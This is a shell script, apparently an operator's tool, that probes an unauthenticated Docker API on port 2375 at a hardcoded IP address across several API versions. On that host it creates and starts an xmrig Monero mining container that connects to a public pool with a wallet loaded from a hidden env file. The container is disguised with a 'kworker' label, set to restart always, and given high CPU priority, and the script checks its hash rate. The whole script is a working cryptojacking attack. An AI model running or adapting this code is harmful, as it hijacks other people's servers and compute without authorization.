#!/bin/sh
# Does any API-version prefix make a create STICK on this canned endpoint?
ip=${1:-193.36.116.120}
exec > /tmp/_vs.out 2>&1
. /tmp/.sysd/worker.env
B='{"Image":"xmrig/xmrig","Cmd":["-o","pool.supportxmr.com:443","-u","'"$WALLET"'","-p","node","--no-color","-k","--tls"],"Labels":{"kworker":"1"},"HostConfig":{"RestartPolicy":{"Name":"always"},"CpuShares":2048}}'
for pf in "" "v1.41" "v1.43" "v1.47" "v1.24" "v1.12"; do
    if [ -n "$pf" ]; then base="http://$ip:2375/$pf"; else base="http://$ip:2375"; fi
    nm="kt$(printf '%s' "$pf" | tr -d '.')"
    r=$(curl -sS -m 20 -X POST -H 'Content-Type: application/json' -d "$B" "$base/containers/create?name=$nm" 2>&1)
    id=$(printf '%s' "$r" | grep -o '"Id": *"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
    echo "pf=${pf:-<none>} create=$(printf '%s' "$r" | head -c 80)"
    if [ -n "$id" ]; then
        echo "   id_json=$(curl -sS -o /dev/null -w '%{http_code}' -m 10 "$base/containers/$id/json") name_json=$(curl -sS -o /dev/null -w '%{http_code}' -m 10 "$base/containers/$nm/json") start=$(curl -sS -o /dev/null -w '%{http_code}' -m 15 -X POST "$base/containers/$id/start")"
        sleep 4
        echo "   in_list=$(curl -sS -m 8 "$base/containers/json?all=1" | grep -c "$nm")  logline=$(curl -sS -m 10 "$base/containers/$id/logs?stdout=1&tail=200" 2>/dev/null | tr -d '\000' | grep -o 'speed [^|]*H/s' | tail -1)"
    fi
done
echo done=$(date -u)
